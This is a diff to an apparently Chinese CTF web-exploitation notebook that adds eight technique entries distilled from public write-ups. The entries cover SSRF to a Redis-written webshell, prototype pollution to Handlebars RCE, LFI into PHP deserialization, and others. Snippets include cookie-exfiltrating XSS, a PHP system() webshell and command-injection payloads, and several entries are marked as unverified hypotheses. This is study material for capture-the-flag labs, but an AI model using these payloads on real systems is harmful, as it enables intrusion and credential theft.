@@ -4,6 +4,7 @@ status: verified
 # status 取值：hypothesis（假设）| verifying（验证中）| verified（复跑通过）| refuted（证伪，需附失败原因）| inconclusive（证据不足挂起）；旧词映射 draft≡hypothesis、deprecated≡refuted（见 ../../shared/REFLIGHT.md §1）
 source: "0rangec3t/Black-cat（techniques/web.md 五段式范式）、PayloadsAllTheThings、book.hacktricks.xyz、M2 实测复跑（2026-10-15）"
 changelog:
+  - "[2026-10-30] v0.6：蒸馏 P3 批次并入 8 条（中段困难档·薄域优先，hypothesis 待复跑）｜源：ctf-corpus/distill/by-category/web/p3-20261029.md + candidates.jsonl（P3 批次报告 02） + 修正批同步（46 修正批涉已入库条目，pilot/04-修正简报）（本文件 16 处）"
   - "[2026-10-29] v0.5：蒸馏 P1+P2 批次并入 23 条（hypothesis 待复跑，REFLIGHT §1 二手知识纪律）｜源：ctf-corpus/distill 候选池（candidates.jsonl）+ distill/pilot/01-蒸馏批次报告-P2-20261029.md"
   - "[2026-10-15] 初始空壳，等待首个回流条目"
   - "[2026-10-15] v0.2：条目模板升级为五段式假设条目 + 机器可校验裁决词（REFLIGHT 回流协议，见 ../../shared/REFLIGHT.md）"
@@ -53,6 +54,14 @@ changelog:
 25. [Go 版本差异参数走私（ParseThru 绕 WAF 取文件）](#go-版本差异参数走私parsethru-绕-waf-取文件)（hypothesis）
 26. [JS 混淆还原 + XXTEA 密钥提取（字符串映射表归一化）](#js-混淆还原-xxtea-密钥提取字符串映射表归一化)（hypothesis）
 27. [Java 反序列化 RCE（ysoserial 载荷类名改写）](#java-反序列化-rceysoserial-载荷类名改写)（hypothesis）
+28. [SSRF 双解析域名过环回黑名单 + Redis 写马收尾](#ssrf-双解析域名过环回黑名单-redis-写马收尾)（hypothesis）
+29. [Node 原型污染进 Handlebars 模板 RCE（endsWith WAF 旁路）](#node-原型污染进-handlebars-模板-rceendswith-waf-旁路)（hypothesis）
+30. [静态文件参数任意读多旗串联（/static?f= 路径遍历）](#静态文件参数任意读多旗串联staticf-路径遍历)（hypothesis）
+31. [LFI 源码泄露进 PHP 反序列化（load_board.php 文件名注入）](#lfi-源码泄露进-php-反序列化load_boardphp-文件名注入)（hypothesis）
+32. [古董 JS 多层去混淆（倒序串解出 XOR 密钥 + GIF 载荷）](#古董-js-多层去混淆倒序串解出-xor-密钥-gif-载荷)（hypothesis）
+33. [WebAssembly 反调试逆向（wasm2wat 文本化 + debugger 循环）](#webassembly-反调试逆向wasm2wat-文本化-debugger-循环)（hypothesis）
+34. [zip 多态 MD5 碰撞（EOCD 解析歧义 + 幂等哈希校验）](#zip-多态-md5-碰撞eocd-解析歧义-幂等哈希校验)（hypothesis）
+35. [Bitcoin Script 合约解锁（P2SH 兑换脚本编写）](#bitcoin-script-合约解锁p2sh-兑换脚本编写)（hypothesis）
 
 ### JWT alg=none 签名绕过
 - **假设**：题面给 JWT 且改 payload 后返回 401/签名错误 → 服务端 JWT 库可能接受 `alg:"none"`（把 alg 当分支而非白名单校验），可空签名伪造任意身份。
@@ -146,7 +155,7 @@ changelog:
 - **验证步骤**：1) 构造 `<img src=a onerror='document.querySelector("#score").textContent=document.cookie'>`；2) 提交成绩取得含 payload 的结果 URL；3) 提交 URL 给 bot；4) 读 bot 回传的 greeting/score 字段。
 - **判定标准**：PASS = bot 返回值中含 bot 侧 cookie/旗；FAIL = 元素选择器不匹配或 CSP 拦截 → 改查其他回显元素。
 - **裁决词**：待复跑
-- **来源**：Hackergame 2022 微积分计算小练习（web 200p）｜taoky（官方题解）｜raw/github-repos/hackergame2022/2022_hackergame_h_cn-*.md（bot.py 源码随题给出，行为可全重放）
+- **来源**：Hackergame 2022 微积分计算小练习（web 200p）｜taoky（官方题解）｜raw/github-repos/hackergame2022/2022_hackergame_h_cn-0cb6ef.md（bot.py 源码随题给出，行为可全重放）
 - **陷阱备注**：先验「外带必走网络」的思维定势是主要卡点——离线场景问「谁会读这个页面」，答案直接决定 payload 形态。
 
 ### CSP self 下报错回显页作脚本源（注释缝合合法 JS）
@@ -155,7 +164,7 @@ changelog:
 - **验证步骤**：1) 探测各 action 页面回显点与转义规则；2) `<script src="/index.php?action=send&to=*/alert(1)&content=/*">` 自发消息验证执行；3) 升级 payload 为 `document.location=location.hash.substr(1)+document.cookie`；4) 发触发消息给管理员，再诱其访问带 `#` 的 URL。
 - **判定标准**：PASS = 收到含管理员 cookie 的消息；FAIL = 引号被转义 → 改 hash 传参绕开字符串字面量。
 - **裁决词**：待复跑
-- **来源**：ISG 2015 xssme（web，p4）｜p4（波兰战队）｜raw/github-repos/p4/2015_isg_e_xssme.md（payload 与三段式利用链全文在 WP）
+- **来源**：ISG 2015 xssme｜六星战队（中国）｜raw/github-repos/sixstars/2015_isg_h_writeup_p2.md（payload 与三段式利用链全文在 WP）
 
 ### lesspipe 文件类型分发链 RCE（ar 选项文件 + 插件加载）
 - **分层**：困难档·组件生态缺陷
@@ -163,7 +172,7 @@ changelog:
 - **验证步骤**：1) 与题目同构 Dockerfile 起 lesspipe 环境；2) printf 构造 `.a` 内容 `ar rc ./@.a /dev/null` 生成伪归档；3) 三文件按序上传；4) 替换命令为 `cat /flag` 重传。
 - **判定标准**：PASS = 返回页含命令输出；FAIL = lesspipe 未启用（无 LESSOPEN）→ 转查其他预处理器（groff/man 等）。
 - **裁决词**：待复跑
-- **来源**：Hackergame 2024 LESS 文件查看器在线版（web 250p）｜zzh1996（官方题解）｜raw/github-repos/hackergame2024/2024_hackergame_h_*.md（Dockerfile + 复现命令全文；原始讨论 seclists 2014）
+- **来源**：Hackergame 2024 LESS 文件查看器在线版（web 250p）｜zzh1996（官方题解）｜raw/github-repos/hackergame2024/2024_hackergame_h_less.md（Dockerfile + 复现命令全文；原始讨论 seclists 2014）
 - **陷阱备注**：上传顺序敏感（`@.a` 必须最后）——浏览器按大小排序或 curl 脚本控制顺序；「只是看个文件」的服务也可能承载完整文件类型分发生态。
 
 ### S3 桶公开列举与对象直读（注释情报链）
@@ -172,7 +181,7 @@ changelog:
 - **验证步骤**：1) `curl` 首页并提取全部 HTML 注释；2) 依次试探注释中的桶名 endpoint；3) 根路径 GET 观察是否返回 XML 列举；4) 按 Key 路径拼接直读对象。
 - **判定标准**：PASS = 拿到旗对象内容；FAIL = 403（列举被禁）→ 转猜键名/版本 ID 或审计页面静态资源引用。
 - **裁决词**：待复跑
-- **来源**：TAMUctf 2019 Buckets（web 362p）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（完整 curl 链与桶名线索在 WP；服务下线，复现需自建 minio 同构环境）
+- **来源**：TAMUctf 2019 Buckets（web 362p）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2019_buckets-md_h_buckets.md（完整 curl 链与桶名线索在 WP；服务下线，复现需自建 minio 同构环境）
 - **关联**：情报入口与 [[OSINT：证书透明度与被动域收集]] 同属「被动线索优先」纪律族。
 
 ### phar 反序列化（图片 stub 伪装 + 魔术方法命令拼接）
@@ -181,7 +190,7 @@ changelog:
 - **验证步骤**：1) 审上传与消费路径定位触发点（file_get_contents/DOMDocument 等）；2) PHP 脚本构造 phar：stub=`JPEG 头 + __HALT_COMPILER(); ?>`，metadata=`Image(file_name=" ;./flag_dispenser; ")`；3) 上传后经触发路径访问；4) 观察命令输出。
 - **判定标准**：PASS = 旗程序输出回显；FAIL = PHP ≥8.0 元数据禁用 → 转查其他反序列化入口（SESSION/JSON）。
 - **裁决词**：待复跑
-- **来源**：Midnight Sun CTF 2019 Quals Rubenscube（web 424p，26 solved）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（upload.php 源码与 phar 构造脚本在 WP）
+- **来源**：Midnight Sun CTF 2019 Quals Rubenscube（web 424p，26 solved）｜perfect blue (战队)｜raw/github-repos/perfectblue/2019_midnightsun-ctf-quals_h_rubenscube.md（upload.php 源码与 phar 构造脚本在 WP）
 - **陷阱备注**：上传校验用 getimagesize 不认 SVG → SVG 走 DOMDocument + LIBXML_NOENT 另开 XXE 文件读取面（同一题双解路径，审题先画上传→消费全链）。
 
 ### SSRF 协议走私（CRLF 注入 SMTP 会话外带数据）
@@ -190,7 +199,7 @@ changelog:
 - **验证步骤**：1) 定位图片 URL 参数可指向任意 scheme/host/port；2) CRLF 编码注入完整 SMTP 会话；3) RCPT TO 填自控邮箱；4) DATA 段拼旗参数后以 `.` 结束。
 - **判定标准**：PASS = 收到含旗邮件；FAIL = 换行被 strip → 转查是否支持 redirect/gopher 协议二次走私。
 - **裁决词**：待复跑
-- **来源**：CTFzone Quals 2018 MMORPG 3000（web 470p，2 solved）｜p4（波兰战队）｜raw/github-repos/p4/2018_ctfzone-quals_e_mmorpg.md（中间层与完整走私 URL 在 WP）
+- **来源**：CTFzone Quals 2018 MMORPG 3000（web 470p，2 solved）｜p4（波兰战队）｜raw/github-repos/p4/2018_ctfzone-quals_h_mmorpg.md（中间层与完整走私 URL 在 WP）
 - **关联**：与 [[SSRF 打云 metadata 与内网]] 同族不同层——母条目管「打到哪」，本条管「非 HTTP 协议怎么走私载荷」。
 
 ### Kerberos AS-REP Roast（无预认证用户哈希离线爆破）
@@ -199,7 +208,7 @@ changelog:
 - **验证步骤**：1) SQLi 回显点 UNION 定位列；2) 用户名逐个 kadmin 验证；3) GetNPUsers -no-pass 拿哈希；4) hashcat 字典爆破；5) 凭据回登录处使用。
 - **判定标准**：PASS = 恢复口令并登录见旗；FAIL = 全员开启预认证 → 转 kerberoast（TGS 票据）路径。
 - **裁决词**：待复跑
-- **来源**：The Catch 2021 Phone Book（web，cat10=web/recon）｜p4（波兰战队）｜raw/github-repos/p4/2021_thecatch_e_phone-book.md（四步命令序列完整在 WP；需 KDC 环境，可自建 samba AD 复放）
+- **来源**：The Catch 2021 Phone Book｜vernjan｜raw/github-repos/vernjan/write-ups/TheCatch2021/05-system-access/03-phone-book/README.md（四步命令序列完整在 WP；需 KDC 环境，可自建 samba AD 复放）
 - **陷阱备注**：用户枚举的入口未必在 88 端口——Web 层信息泄露（报错回显）常是 principal 名的来源；「先枚举再选攻击」与 [[nmap 赛题环境探测]] 同纪律。
 
 ### 受限 shell 无命令读文件（展开/coproc/补全原语）
@@ -208,7 +217,7 @@ changelog:
 - **验证步骤**：1) `compgen -c | sort -u` 盘点内建面；2) 逐一试 `$(</flag)`、coproc 报错、read 变量+`echo` 级联；3) 短路符/重定向组合执行受限二进制。
 - **判定标准**：PASS = 任一原语回显旗内容；FAIL = 输出全静默 → 转退出码侧信道（||/&& 链）逐位探测。
 - **裁决词**：待复跑
-- **来源**：H4CK1NG G00GL3 2022 Episode 2 Challenge 3（web/shell）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（多种解法原语对照在 WP，纯交互可重放）
+- **来源**：H4CK1NG G00GL3 2022 Episode 2 Challenge 3（web/shell）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2022_e02c03-md_h_e02c03.md（多种解法原语对照在 WP，纯交互可重放）
 - **陷阱备注**：先问「shell 本身给了我什么」（内建/补全/展开/作业控制），再想「要什么命令」——问法反转是此类题钥匙。
 
 ### 纯字母数字命令注入（十进制 IP 下载 + 文件链重命名）
@@ -217,7 +226,7 @@ changelog:
 - **验证步骤**：1) 自建仅数字域名的接收端与同构过滤环境；2) `wget 92775836` 拉取 payload；3) tar 重命名链；4) `php archived` 落 `shell.php` 后经 `/sandbox/<IP>/shell.php` 访问。
 - **判定标准**：PASS = webshell 命令执行；FAIL = 目录名不可控（REMOTE_ADDR 沙箱）→ 转纯数字目录内的相对路径技巧。
 - **裁决词**：待复跑
-- **来源**：HITCON 2015 babyfirst（web 100p）｜p4（波兰战队）｜raw/github-repos/p4/2015_hitcon_e_babyfirst.md（命令序列与 exploit 源码全文在 WP）
+- **来源**：HITCON 2015 babyfirst（web 100p）｜p4（波兰战队）｜raw/github-repos/p4/2015_hitcon_h_babyfirst.md（命令序列与 exploit 源码全文在 WP）
 
 ### 弱时间种子签名密钥恢复（Django SECRET_KEY 伪造）
 - **分层**：困难档·密码学工程缺陷
@@ -225,7 +234,7 @@ changelog:
 - **验证步骤**：1) 逆向出生成算法字符集与长度（猜常见模式）；2) 从当前时间向前枚举种子；3) 每候选 key 调 unsign 验证存量 cookie；4) 命中后伪造目标签名对象请求。
 - **判定标准**：PASS = 伪造签名通过服务端校验；FAIL = 种子含更多熵（毫秒/进程 ID）→ 转分析生成器可观测输出。
 - **裁决词**：待复跑
-- **来源**：InsomniHack 2022 hopytal（web）｜p4（波兰战队）｜raw/github-repos/p4/2022_insomnihack_e_hopytal.md（生成器代码与爆破循环在 WP；本地 Django 可完整重放）
+- **来源**：InsomniHack 2022 hopytal（web）｜p4（波兰战队）｜raw/github-repos/p4/2022_insomnihack_h_hopytal.md（生成器代码与爆破循环在 WP；本地 Django 可完整重放）
 - **关联**：与 [[python 手工构造/校验 JWT]] 相邻主题——签名伪造的前提都是「拿得到签名密钥」。
 
 ### system() 命令注入（IFS 替空格 + 短路链）
@@ -234,7 +243,7 @@ changelog:
 - **验证步骤**：1) 发 `url=ls` 观察报错确定拼接种类（ping/curl 等）；2) 注入 `||` 短路验证执行；3) `${IFS}` 绕空格过滤读旗文件。
 - **判定标准**：PASS = 页面回显旗；FAIL = 命令输出被剥离 → 转时间/出网侧信道。
 - **裁决词**：待复跑
-- **来源**：Hacky Easter 2021 Social Checker（web）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（payload 与响应全文在 WP；本地 php system 同构可复放）
+- **来源**：Hacky Easter 2021 Social Checker（web）｜cartoon-raccoon｜raw/github-repos/cartoon-raccoon_hackyeaster2021/level5/SocialChecker/README.md（payload 与响应全文在 WP；本地 php system 同构可复放）
 - **关联**：Q1 边界——与「纯字母数字命令注入」同属受限命令注入族，关键差异 = 本条字符黑名单走 shell 语法替身（IFS/短路），白名单条走工具特性链（十进制 IP/tar 重命名）。
 
 ### Oracle SQL 解谜（窗口函数 + CONNECT BY 层级聚合）
@@ -243,7 +252,7 @@ changelog:
 - **验证步骤**：1) 读题把积分表目标转译为分组/层级约束；2) 子查询逐段构造并单测；3) `||` 拼接完整答案码提交 GET 参数。
 - **判定标准**：PASS = 查询返回旗码；FAIL = 方言不匹配（MySQL/PG）→ 按目标库改写窗口/递归等价物。
 - **裁决词**：待复跑
-- **来源**：Hackvent 2014 December 10th: SQL hero（web）｜Shiltemann（Galaxians）｜raw/github-repos/Shiltemann/*.md（完整 SQL 语句在 WP；本地 Oracle XE 或 livesql 可重放）
+- **来源**：Hackvent 2014 December 10th: SQL hero（web）｜Shiltemann（Galaxians）｜raw/github-repos/shiltemann/2014_hackvent_h_dec10.md（完整 SQL 语句在 WP；本地 Oracle XE 或 livesql 可重放）
 - **关联**：与 [[PPC 脚本题约束建模]] 同族——把约束塞进现成引擎（SQL）而不是写程序。
 
 ### PHP assert 字符串注入（单引号逃逸执行 + .git 源码泄露）
@@ -252,7 +261,7 @@ changelog:
 - **验证步骤**：1) `.git/` 可遍历性确认（HTTP 直访 objects）；2) diggit/手工恢复 index.php；3) 构造 `?page=x'.system('cd /var/www/html/;git diff;').'` 断言逃逸；4) 输出中取旗。
 - **判定标准**：PASS = 断言逃逸执行命令回显旗；FAIL = assert 被禁用（PHP 7.2 字符串断言弃用 / 8.0 移除）→ 转其他拼接点。
 - **裁决词**：待复跑
-- **来源**：CSAW CTF 2016 mfw（web 125p）｜bl4de（S1 扩容源）｜raw/github-repos/bl4de/*.md（payload 与 diggit 用法在 WP；本地 php<7.2 同构可复放）
+- **来源**：CSAW CTF 2016 mfw（web 125p）｜bl4de（S1 扩容源）｜raw/github-repos/bl4de/2016_csaw-ctf_h_mfw-web125.md（payload 与 diggit 用法在 WP；本地 php<7.2 同构可复放）
 - **关联**：与 [[git 历史考古取旗（log 提交信息 / blame 作者 / 丢失提交找回）]] 为姊妹族——本地 git 取证 vs 服务端 .git 目录泄露，两侧互补。
 
 ### Java 反序列化 XML gadget + SpEL 表达式注入（T() 静态调用）
@@ -261,7 +270,7 @@ changelog:
 - **验证步骤**：1) 反编译 war 定制 OIS 白名单；2) 自造类 writeObject 注入 XXE payload 读 key；3) 受限接口组 SpEL（T() 类方法 + && 短路缝合）；4) 旗从异常栈回显。
 - **判定标准**：PASS = 两段链打通取旗；FAIL = 白名单挡 gadget → 找白名单类自身 gadget；SpEL 版本限制 T() → 转其他表达式上下文。
 - **裁决词**：待复跑
-- **来源**：TrendMicro CTF 2019 Quals Exploit 300（300p）｜p4（波兰战队）｜raw/github-repos/p4/*.md（两段 payload 全文在 WP；本地 Tomcat 可重放）
+- **来源**：TrendMicro CTF 2019 Quals Exploit 300（300p）｜p4（波兰战队）｜raw/github-repos/p4/2019_trendmicro-quals_h_exploit-300.md（两段 payload 全文在 WP；本地 Tomcat 可重放）
 
 ### Flask 弱密钥枚举会话伪造（字典 secret 离线爆破）
 - **分层**：困难档·弱随机
@@ -269,7 +278,7 @@ changelog:
 - **验证步骤**：1) 读源码（题面附）确认 secret 生成池；2) flask-unsign 解 cookie；3) 字典枚举命中 key；4) 重签 admin cookie 提交。
 - **判定标准**：PASS = 伪造会话通过；FAIL = secret 高熵 → 转服务端会话/其他注入面。
 - **裁决词**：待复跑
-- **来源**：picoCTF 2021 Most Cookies（web 150p）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（完整脚本在 WP；本地 Flask 同构秒级重放）
+- **来源**：picoCTF 2021 Most Cookies（web 150p）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2021_most-cookies-md_h_most-cookies.md（完整脚本在 WP；本地 Flask 同构秒级重放）
 - **关联**：与 [[游戏状态存 Flask cookie（rarity=0 取旗不可能 → 离线解码）]] 互补——解码侧 vs 伪造侧（弱密钥条件）
 
 ### EXIF 元数据注入 SQL（盲注 rlike 面板）
@@ -278,7 +287,7 @@ changelog:
 - **验证步骤**：1) 上传带合法 EXIF 的图确认字段入库；2) exiftool -Software= 注入 rlike 布尔判别式；3) 观察面板命中与否逐位爆破；4) 拼旗。
 - **判定标准**：PASS = 面板差分可判且拼出旗；FAIL = 字段长度截断 → 缩短 payload 或改注释内联。
 - **裁决词**：待复跑
-- **来源**：KLCTF 2017 web200（DCCTF-finals）｜六星战队（中国）｜raw/github-repos/sixstars/2017_dcctf_h_web200.md（注入模板与逐位脚本在 WP；本地 MySQL 同构可重放）
+- **来源**：DCTF finals 2015 web200｜p4（波兰战队）｜raw/github-repos/p4/2015_dctffinals_h_web200.md（注入模板与逐位脚本在 WP；本地 MySQL 同构可重放）
 - **关联**：与 [[sqlmap 基线用法]] 的通道差——注入面在上传文件元数据而非请求参数（sqlmap 盲扫覆盖不到的「二次注入」形态）。
 
 ### Go 版本差异参数走私（ParseThru 绕 WAF 取文件）
@@ -308,3 +317,75 @@ changelog:
 - **来源**：Trend Micro CTF 2018 misc-300（misc 300p/37 解）｜Balsn（战队）｜raw/github-repos/balsn/slices/20180914-trendmicroctf/misc-300.md（Server.java 与载荷改写脚本在 WP；本地 tomcat+jar 可重放）
 - **关联**：[[Java XMLDecoder 签名文件反序列化 RCE]] 的姊妹原语——XMLDecoder 直接执行 vs ObjectInputStream gadget 链，公共前提都是「类路径含已知 gadget 库」。
 - **陷阱备注**：Q1 归位说明——按反序列化实类归 web（选材线记 reverse 系合集归类）；类名长度前缀（首字节）必须同步改，否则流解析错位。
+
+### SSRF 双解析域名过环回黑名单 + Redis 写马收尾
+- **分层**：困难·多段链
+- **假设**：secure-httpbin 三洞链：① SSRF 服务禁内网/环回 IP 但不禁域名——把自控域名 A 记录同时绑 127.0.0.1 与公网 IP，解析器多查返回环回即绕过；② vhost 按域名路由进不了 sandbox，改扫端口发现 Redis；③ POST 请求可向 Redis 发指令，CONFIG SET dir/dbfilename + SAVE 落 webshell；LFI（?nolog）报错回显拼出 web 根路径。
+- **验证步骤**：1) DNS 控制台给域名配 127.0.0.1+A 记录；2) SSRF 接口带该域名访问 http://域名:6379；3) POST SET x "<?php system($_GET['cmd']); ?>"、CONFIG SET dir /var/www/sandbox、CONFIG SET dbfilename evil.php、SAVE；4) 访问 /evil.php?cmd= 取 flag。
+- **判定标准**：PASS = 写入的 php 被解析执行；FAIL = 只绕过 SSRF 但往 vhost 域名 80 端口打 flag.php（vhost 按域名分流拿不到）——必须切 Redis 端口。
+- **裁决词**：待复跑
+- **来源**：DeFCAMP CTF Quals 2017 secure-httpbin｜六星战队｜raw/github-repos/sixstars/2017_defcamp-ctf_h_writeup.md（三漏洞清单+redis 指令序列在 WP）
+- **关联**：与 [[SSRF 协议走私（CRLF 注入 SMTP 会话外带数据）]] 同属 SSRF 边界突破族，本条走「DNS 语义」而非协议走私；Redis 写马与 [[Java XMLDecoder 签名文件反序列化 RCE]] 共享「把可达服务变成落盘通道」。
+
+### Node 原型污染进 Handlebars 模板 RCE（endsWith WAF 旁路）
+- **分层**：困难·多段链
+- **假设**：easy_node 的 express 服务 /src 自曝源码：mergeValue 递归合并 req.body 进 defaultTemplate（无 hasOwnProperty 防御）→ __proto__ 污染可改 template/text 字段；WAF 只对请求体字符串值做「endsWith 黑名单后缀」匹配。路径：污染 template 字段注入 Handlebars SSTI（partial/constructor 链）达成 RCE，绕 WAF 靠把 payload 放到非字符串位置（数组/对象）或用非后缀敏感写法。
+- **验证步骤**：1) GET /src 审源码定位 mergeValue 与 WAF 循环；2) 构造 {"pathKey":..., "data":{"__proto__":{"template":"{{#with ...}}..."}}} 注入；3) Handlebars 模板用 constructor.prototype / require 链取 child_process；4) 回显验证命令执行读 flag。
+- **判定标准**：PASS = 污染后模板编译执行系统命令；FAIL = 直接往 template 塞 payload 被 endsWith WAF 拦（黑名单按后缀匹配——payload 不能以敏感词结尾）。
+- **裁决词**：待复跑
+- **来源**：能源网络安全大赛 2025 easy_node｜CTF-Archives 官方存档｜raw/cn-events/energy2025/2025_energy2025_easy_node-2.md（app.js 全量在存档，WAF 语义可复核；存档仅题面，解法为推断）
+- **关联**：与 [[Flask 弱密钥枚举会话伪造（字典 secret 离线爆破）]]不同本条走「框架级状态污染」；与 [[phar 反序列化（图片 stub 伪装 + 魔术方法命令拼接）]] 共享「自曝源码→找不可见注入面」路径。
+
+### 静态文件参数任意读多旗串联（/static?f= 路径遍历）
+- **分层**：困难·多段链
+- **假设**：RARO 站多点部署同源代码：/static?f=index.css 只做前缀拼接未白名单，改 f=main.py 读源码、f=backup.txt 读备份凭据（developerBackupCode4321）；登录后沿同参数继续读 admin 面板源码与上传目录，逐旗推进——一个读原语吃穿全站。
+- **验证步骤**：1) 观察页面引用 /static?f= 端点；2) 依次试 main.py/app.py、backup.txt；3) 用备份凭据登录拿会话；4) 按源码提示扩展读 upload/log 路径逐旗。
+- **判定标准**：PASS = 单端点读出 ≥3 个不同 flag；FAIL = 只当 CSS 加载器不试文件参数（或源码猜 app.py 不中——先试 main.py 再试 app.py）。
+- **裁决词**：待复跑
+- **来源**：AwesomeCTF 2020 RARO｜Adrien Poirrier (Q C)｜raw/github-repos/apoirrier/2020_awesomectf_h_raro.md（全站 5+ 旗解法路径在 WP）
+- **关联**：与 [[S3 桶公开列举与对象直读（注释情报链）]] 同属「读原语串联」；备份凭据链与 [[受限 shell 无命令读文件（展开/coproc/补全原语）]]共享「先找凭据再提权」节奏。
+
+### LFI 源码泄露进 PHP 反序列化（load_board.php 文件名注入）
+- **分层**：困难·多段链
+- **假设**：h4ck1ng g00gl3 第二集 E01C03：admin 面板入口被砍，但 load_board.php 的 filename 参数可读任意文件（/etc/passwd → index.php 源码）；源码显示 move_end 参数经 unserialize() 且类方法可用——构造 POP 链 serialize 载荷触发 env 读取（提示「flag 在 envs 里」）。
+- **验证步骤**：1) POST filename=/etc/passwd 验证路径读；2) filename=index.php 拿源码定 unserialize 点与可用类；3) 本地构造序列化对象串；4) curl "?move_end=$(php serialize 载荷)" 触发，回显 grep flag。
+- **判定标准**：PASS = 反序列化链取到 env flag；FAIL = 继续打 admin 登录（本集面板已移除，属上一集解法残留思路）。
+- **裁决词**：待复跑
+- **来源**：H4ck1ng Google 2022 E01C03｜Dvd848 (S1扩容)｜raw/github-repos/Dvd848/2022_e01c03-md_h_e01c03.md（源码全量+序列化利用脚本在 WP）
+- **关联**：与 [[Java 反序列化 XML gadget + SpEL 表达式注入（T() 静态调用）]] 跨语言同构（PHP POP 链 vs Java gadget）；LFI 源码先行与 [[PHP assert 字符串注入（单引号逃逸执行 + .git 源码泄露）]]共享「先拿源码再选注入面」纪律。
+
+### 古董 JS 多层去混淆（倒序串解出 XOR 密钥 + GIF 载荷）
+- **分层**：困难·多段链
+- **假设**：trendmicro offensive-400 的 ads.js 反爬混淆：函数名/字符串经倒序取值（gs() 按隔位倒序拼串）、XOR 密钥 = (month)*(day)+1+day 之类的日期弱密钥、数据段藏于站点 GIF 文件字节流；把 eval 改 console.log 逐层剥（innerHTML 注入改打日志）即可还原第二层，再解第三层取 payload。
+- **验证步骤**：1) 阅读混淆壳定位 gs()/ej() 派发结构；2) 手工逆 gs 串得子函数名；3) 用固定日期代入解 XOR 层；4) 提取 GIF 中数据段按长度+偏移解码 payload。
+- **判定标准**：PASS = 逐层还原出最终可读 payload/flag；FAIL = 硬逆 ActiveXObject 兼容分支（IE 专用死代码）浪费时间。
+- **裁决词**：待复跑
+- **来源**：TrendMicro CTF 2016 offensive-400｜p4 (波兰战队)｜raw/github-repos/p4/2016_trendmicro_h_offensive-400.md（三层混淆代码与替换点全量在 WP）
+- **关联**：与 [[JS 混淆还原 + XXTEA 密钥提取（字符串映射表归一化）]] 同族 JS 剥壳；「eval→console.log 换钩」与 [[brainfuck VM 执行轨迹跟踪（解码即抹零）]]共享「改执行器不硬逆」方法论。
+
+### WebAssembly 反调试逆向（wasm2wat 文本化 + debugger 循环）
+- **分层**：困难·多段链
+- **假设**：egg-storage 的校验逻辑编入 WebAssembly：前端 nope() 函数 100 次 debugger 语句作反调试（直接开 DevTools 会断死）；须改本地副本去多数 debugger（保留一处作断点锚）、wabt 工具链 wasm2wat/wasm-decompile 出文本层，再分析校验函数数据段取蛋码。
+- **验证步骤**：1) 下载 index.html/wasm 改 <base href> 指向线上资源使本地可跑；2) 循环里 100 个 debugger 删 99 留 1 作断点；3) Firefox（wasm 调试工具较优）断点进校验函数；4) wasm2wat --generate-names 导文本读常量比较表。
+- **判定标准**：PASS = 从 wasm 文本层提取出正确蛋码；FAIL = 在 DevTools 里硬穿 100 次 debugger 循环（断点轰炸不可持续）。
+- **裁决词**：待复跑
+- **来源**：Hacky Easter 2019 Egg Storage｜verath（站点存档）｜raw/github-repos/verath_hacky-easter-2019/18-EggStorage/README.md（content.wat 文本与本地化 patch diff 在 WP；wasm2wat 命令为方法补全）
+- **关联**：与 [[Android Mono 运行时反混淆（魔改 opcode 表 + ILSpy 还原）]] 同族「VM 字节码文本化」；anti-debug 处置与 [[Windows 逆向前置条件 patch（参数校验 + PEB 反调试 #DE）]]共享「改造运行环境再逆」直觉。
+
+### zip 多态 MD5 碰撞（EOCD 解析歧义 + 幂等哈希校验）
+- **分层**：困难·多段链
+- **假设**：ls 上传服务以「已验证 zip 的 MD5」做幂等去重：同 MD5 的后续 zip 不再验证直接执行其中命令。构造两个 MD5 相同、内容不同的 zip：ls 版含 ls 命令过首验，cat 版含 cat flag——利用 zip 中心目录/EOCD 解析歧义（同 MD5 前缀碰撞 + 目录偏移差异使两文件按解析器行为取不同条目）绕「校验过=可信」逻辑。
+- **验证步骤**：1) echo "ls -al" > ls.txt 打包上传首验；2) 用碰撞工具生成同 MD5 前缀的双 zip（一存 ls.txt 一存 cat flag.txt）；3) 上传 cat 版命中已存哈希免验；4) 服务端执行 cat 输出 flag。
+- **判定标准**：PASS = 免验执行 cat 拿 flag；FAIL = 尝试纯内容碰撞（无 fastcoll 前缀不可能）或以为要强抗碰撞性（只需解析歧义）。
+- **裁决词**：待复跑
+- **来源**：Check Point CSA 2021 ls｜Dvd848 (S1扩容)｜raw/github-repos/Dvd848/2021_ls-md_h_ls.md（十六进制对照与服务交互全量在 WP）
+- **关联**：与 [[Merkle-Damgård 长度扩展攻击（hashpumpy 伪造 token）]] 同属「MD5 结构性弱点工程化」；与 [[EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）]]共享「格式解析器行为差」底层直觉。
+
+### Bitcoin Script 合约解锁（P2SH 兑换脚本编写）
+- **分层**：困难·单点
+- **假设**：BTC 题给一笔 161500.99 BTC 的 P2SH 交易与 pubkey script（7401248801017901ff...）：读懂 Bitcoin Script 栈机语义（OP_DUP/OP_HASH160/OP_EQUALVERIFY/OP_CHECKSIG 与分支 OP_IF），把题给的公钥/签名按脚本期望的栈序排进 unlocking script，广播解锁即可「找回」错转币并兑 flag。
+- **验证步骤**：1) 从题面 hex 还原脚本结构（含 hint 注释）；2) 按 OP_IF 分支排 unlock 栈（pubkey、hash、签名次序按验证逻辑倒推）；3) 本地 Script 解释器（或 bitcoinjs）先干跑；4) 提交解锁脚本过站点校验。
+- **判定标准**：PASS = 解锁脚本过验并得 flag；FAIL = 栈序反了（CHECKSIG 前签名/公钥顺序不能颠倒）或把 hash puzzle 当地址 Base58Check 处理。
+- **裁决词**：待复跑
+- **来源**：Intents CTF 2021 BTC｜Dvd848 (S1扩容)｜raw/github-repos/Dvd848/2021_btc-md_h_btc.md（Pkscript hex 与解码步骤在 WP）
+- **关联**：与 [[游戏状态存 Flask cookie（rarity=0 取旗不可能 → 离线解码）]] 共享「读懂自定义状态编码再改写」思路；栈机语义与 [[自改写字节码 VM 谐振编程（三层变换 + 精确周期预算）]]同属栈式虚拟机域。
